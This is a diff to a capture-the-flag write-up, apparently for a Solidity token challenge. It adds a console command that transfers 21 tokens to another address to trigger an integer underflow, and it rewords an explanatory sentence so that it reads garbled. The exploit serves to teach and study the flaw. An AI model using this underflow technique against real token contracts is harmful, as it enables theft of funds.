@@ -67,7 +67,11 @@ More about [overflow and underflow vulnerability in solidity.](https://hackernoo
 
 ## Subverting
 
-The only thing that will solve this challenge is to send value greater than 20 to the **_value** variable and transfer an address which is not ours.
+The only thing that will solve this challenge is to send value to an address greater than 20 to the **_value** variable and transfer an address which is not ours.
+
+```shell
+await contract.transfer( "0x1824d95Fc8b6fFF19867D09654bCF1369AeD4C21", 20 + 1)
+```
 
 ```shell
 await contract.balanceOf('0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b')
